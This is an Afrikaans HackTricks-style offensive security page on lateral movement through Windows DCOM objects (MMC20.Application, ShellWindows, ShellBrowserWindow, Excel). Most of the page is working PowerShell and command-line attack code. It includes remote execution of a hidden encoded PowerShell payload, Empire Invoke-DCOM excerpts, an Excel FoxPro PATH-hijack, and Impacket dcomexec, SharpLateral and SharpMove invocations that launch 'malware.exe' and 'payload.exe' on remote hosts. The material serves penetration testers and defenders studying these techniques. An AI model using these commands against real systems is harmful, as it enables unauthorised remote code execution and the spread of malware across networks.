# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

DCOM laterale beweging is aantreklik omdat dit bestaande COM servers hergebruik wat oor RPC/DCOM blootgestel word, in plaas daarvan om 'n diens of geskeduleerde taak te skep. In die praktyk beteken dit dat die aanvanklike verbinding gewoonlik op TCP/135 begin en daarna na dinamies toegewysde hoë RPC-poorte beweeg.

## Voorvereistes en slaggate

- Jy benodig gewoonlik 'n plaaslike administrateur-konteks op die teiken, en die afgeleë COM server moet afgeleë launch/activation toelaat.
- Sedert **14 Maart 2023** dwing Microsoft DCOM hardening vir ondersteunde stelsels af. Ou clients wat 'n lae activation authentication level versoek, kan misluk tensy hulle ten minste `RPC_C_AUTHN_LEVEL_PKT_INTEGRITY` onderhandel. Moderne Windows clients word gewoonlik outomaties opgegradeer, dus werk huidige tooling normaalweg steeds.<sup>[[3]](#references)</sup>
- Handmatige of geskripte DCOM execution benodig oor die algemeen TCP/135 plus die teiken se dinamiese RPC-poortreeks. As jy Impacket se `dcomexec.py` gebruik en command output wil terugkry, benodig jy gewoonlik ook SMB-toegang tot `ADMIN$` (of 'n ander skryfbare/leesbare share).
- Indien RPC/DCOM werk maar SMB geblokkeer word, kan `dcomexec.py -nooutput` steeds nuttig wees vir blinde execution.

Vinnige kontroles:
```bash
# Enumerate registered DCOM applications
Get-CimInstance Win32_DCOMApplication | Select-Object AppID, Name

# Useful to inspect firewall/RPC issues
Test-NetConnection -ComputerName 10.10.10.10 -Port 135
```
## MMC20.Application

**Vir meer inligting oor hierdie tegniek, kyk na die oorspronklike plasing by [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)**<sup>[[1]](#references)</sup>

Distributed Component Object Model (DCOM)-objects bied 'n interessante vermoë vir netwerkgebaseerde interaksies met objects. Microsoft verskaf omvattende dokumentasie vir beide DCOM en Component Object Model (COM), wat [hier vir DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) en [hier vir COM](<https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363(v=vs.85).aspx>) beskikbaar is. 'n Lys van DCOM-toepassings kan verkry word met die PowerShell-opdrag:
```bash
Get-CimInstance Win32_DCOMApplication
```
Die COM-object, [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), maak scripting van MMC snap-in-bewerkings moontlik. Hierdie object bevat veral ’n `ExecuteShellCommand`-method onder `Document.ActiveView`. Meer inligting oor hierdie method is [hier](<https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx>) beskikbaar. Kyk hoe dit uitgevoer word:<sup>[[6]](#references)</sup>

Hierdie feature maak die uitvoering van commands oor ’n network deur middel van ’n DCOM application moontlik. Om op afstand met DCOM as ’n admin te interaksie, kan PowerShell soos volg gebruik word:
```bash
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```
Hierdie opdrag koppel aan die DCOM application en gee ’n instansie van die COM object terug. Die ExecuteShellCommand-metode kan dan aangeroep word om ’n proses op die afgeleë host uit te voer. Die proses behels die volgende stappe:

Gaan metodes na:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```
Kry RCE:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView.ExecuteShellCommand(
"cmd.exe",
$null,
"/c powershell -NoP -W Hidden -Enc <B64>",
"7"
)
```
Die laaste argument is die vensterstyl. `7` hou die venster geminimaliseer. Operasioneel lei MMC-gebaseerde uitvoering gewoonlik daartoe dat ’n afgeleë `mmc.exe`-proses jou payload voortbring, wat verskil van die Explorer-gesteunde objekte hieronder.

## ShellWindows & ShellBrowserWindow

**Vir meer inligting oor hierdie tegniek, kyk na die oorspronklike plasing [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**<sup>[[2]](#references)</sup>

Daar is vasgestel dat die **MMC20.Application**-objek nie eksplisiete "LaunchPermissions" het nie en verstek na permissions wat Administrators toegang verleen. Vir verdere besonderhede kan ’n draad [hier](https://twitter.com/tiraniddo/status/817532039771525120) nagegaan word, en die gebruik van [@tiraniddo](https://twitter.com/tiraniddo) se OleView .NET om objekte sonder eksplisiete Launch Permission te filter, word aanbeveel.

Twee spesifieke objekte, `ShellBrowserWindow` en `ShellWindows`, is uitgelig weens hul gebrek aan eksplisiete Launch Permissions. Die afwesigheid van ’n `LaunchPermission`-registerinskrywing onder `HKCR:\AppID\{guid}` dui op geen eksplisiete permissions nie.

In vergelyking met `MMC20.Application` is hierdie objekte dikwels stiller vanuit ’n OPSEC-perspektief, omdat die command gewoonlik as ’n child van `explorer.exe` op die afgeleë host eindig, eerder as van `mmc.exe`.

### ShellWindows

Vir `ShellWindows`, wat nie ’n ProgID het nie, fasiliteer die .NET-metodes `Type.GetTypeFromCLSID` en `Activator.CreateInstance` die instansiasie van die objek deur sy AppID te gebruik. Hierdie proses gebruik OleView .NET om die CLSID vir `ShellWindows` te verkry. Nadat dit geïnstantieer is, is interaksie moontlik deur die `WindowsShell.Item`-metode, wat lei tot metode-aanroeping soos `Document.Application.ShellExecute`.

Voorbeeld-PowerShell commands is verskaf om die objek te instansieer en commands op afstand uit te voer:
```bash
# Example
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```
### ShellBrowserWindow

`ShellBrowserWindow` is soortgelyk, maar jy kan dit direk via sy CLSID instansieer en na `Document.Application.ShellExecute` pivot:
```bash
$com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "10.10.10.10")
$obj = [System.Activator]::CreateInstance($com)
$obj.Document.Application.ShellExecute(
"cmd.exe",
"/c whoami > C:\\Windows\\Temp\\dcom.txt",
"C:\\Windows\\System32",
$null,
0
)
```
### Lateral Movement met Excel DCOM Objects

Lateral movement kan bereik word deur Excel DCOM objects uit te buit. Vir gedetailleerde inligting word dit aanbeveel om die bespreking oor die benutting van Excel DDE vir lateral movement via DCOM op [Cybereason se blog](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom) te lees.<sup>[[5]](#references)</sup>

Die Empire-projek verskaf 'n PowerShell-script wat die gebruik van Excel vir remote code execution (RCE) demonstreer deur DCOM objects te manipuleer. Hieronder is snippets uit die script wat op [Empire se GitHub repository](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) beskikbaar is en verskillende metodes toon om Excel vir RCE te abuseer:
```bash
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```
Onlangse navorsing het hierdie gebied uitgebrei met `Excel.Application` se `ActivateMicrosoftApp()`-metode. Die kernidee is dat Excel kan probeer om verouderde Microsoft-toepassings soos FoxPro, Schedule Plus of Project te begin deur die stelsel se `PATH` te deursoek. As ’n operateur ’n payload met een van daardie verwagte name in ’n skryfbare ligging kan plaas wat deel van die teiken se `PATH` is, sal Excel dit uitvoer.<sup>[[4]](#references)</sup>

Vereistes vir hierdie variasie:

- Plaaslike admin op die teiken
- Excel geïnstalleer op die teiken
- Vermoë om ’n payload na ’n skryfbare gids in die teiken se `PATH` te skryf

Praktiese voorbeeld wat die FoxPro-lookup (`FOXPROW.exe`) misbruik:
```bash
copy C:\Windows\System32\calc.exe \\192.168.52.100\c$\Users\victim\AppData\Local\Microsoft\WindowsApps\FOXPROW.exe
$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "192.168.52.100"))
$com.ActivateMicrosoftApp("5")
```
As die aanvallende gasheer nie die plaaslike `Excel.Application` ProgID geregistreer het nie, instansieer die afgeleë objek eerder volgens CLSID:
```bash
$com = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("00020812-0000-0000-C000-000000000046", "192.168.52.100"))
$com.Application.ActivateMicrosoftApp("5")
```
Waardes wat in die praktyk misbruik is:

- `5` -> `FOXPROW.exe`
- `6` -> `WINPROJ.exe`
- `7` -> `SCHDPLUS.exe`

### Outomatiseringsnutsgoed vir Lateral Movement

Twee nutsgoed word uitgelig vir die outomatisering van hierdie tegnieke:

- **Invoke-DCOM.ps1**: ’n PowerShell-script wat deur die Empire-projek verskaf word en die aanroeping van verskillende metodes vir die uitvoer van code op afgeleë masjiene vereenvoudig. Hierdie script is by die Empire GitHub-repository beskikbaar.

- **SharpLateral**: ’n Nutsding wat ontwerp is om code op afstand uit te voer en saam met die volgende command gebruik kan word:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- [SharpMove](https://github.com/0xthirteen/SharpMove):
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## Outomatiese Tools

- Die Powershell-script [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) laat jou toe om maklik al die maniere wat in kommentaar aangedui word, te gebruik om code op ander masjiene uit te voer.
- Jy kan Impacket se `dcomexec.py` gebruik om commands op afgeleë systems met DCOM uit te voer. Huidige builds ondersteun `ShellWindows`, `ShellBrowserWindow` en `MMC20`, en gebruik by verstek `ShellWindows`.
```bash
dcomexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Pick the object explicitly
dcomexec.py -object MMC20 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Blind execution when SMB/output retrieval is not available
dcomexec.py -object ShellBrowserWindow -nooutput 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c calc.exe"
```
- Jy kan ook [**SharpLateral**](https://github.com/mertdas/SharpLateral) gebruik:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- Jy kan ook [**SharpMove**](https://github.com/0xthirteen/SharpMove) gebruik
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## Verwysings

- [1] [Lateral Movement using the MMC20.Application COM Object](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
- [2] [Lateral Movement via DCOM: Round 2](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
- [3] [KB5004442—Bestuur veranderinge vir Windows DCOM Server Security Feature Bypass (CVE-2021-26414)](https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c)
- [4] [Lateral Movement: Misbruik die krag van die DCOM Excel Application](https://specterops.io/blog/2023/10/30/lateral-movement-abuse-the-power-of-dcom-excel-application/)
- [5] [Gebruik Excel DDE vir lateral movement via DCOM](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom)
- [6] [technet.microsoft.com - MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx)

{{#include ../../banners/hacktricks-training.md}}
